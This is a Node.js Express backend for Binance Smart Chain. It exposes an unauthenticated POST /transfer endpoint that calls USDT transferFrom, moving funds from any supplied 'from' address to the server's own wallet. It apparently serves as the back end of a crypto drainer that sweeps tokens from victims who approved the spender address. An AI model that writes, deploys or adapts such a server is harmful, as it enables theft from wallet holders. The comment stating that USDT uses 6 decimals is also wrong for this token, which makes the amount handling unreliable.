require('dotenv').config();
const express = require('express');
const Web3 = require('web3');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());

const web3 = new Web3("https://bsc-dataseed.binance.org/");

const privateKey = process.env.PRIVATE_KEY;
const account = web3.eth.accounts.privateKeyToAccount(privateKey);
web3.eth.accounts.wallet.add(account);

const spender = account.address;
const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";

const abi = [
  {
    constant: false,
    inputs: [
      { name: "sender", type: "address" },
      { name: "recipient", type: "address" },
      { name: "amount", type: "uint256" }
    ],
    name: "transferFrom",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
];

const contract = new web3.eth.Contract(abi, usdtAddress);

app.get("/", (req, res) => {
  res.send("✅ Backend is live. Use POST /transfer");
});

app.post("/transfer", async (req, res) => {
  const { from, amount } = req.body;

  if (!from || !amount) {
    return res.status(400).json({ success: false, error: "Missing 'from' or 'amount'" });
  }

  try {
    const amountInWei = web3.utils.toWei(amount.toString(), 'mwei'); // USDT has 6 decimals

    const tx = await contract.methods
      .transferFrom(from, spender, amountInWei)
      .send({ from: spender, gas: 100000 });

    res.json({ success: true, txHash: tx.transactionHash });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
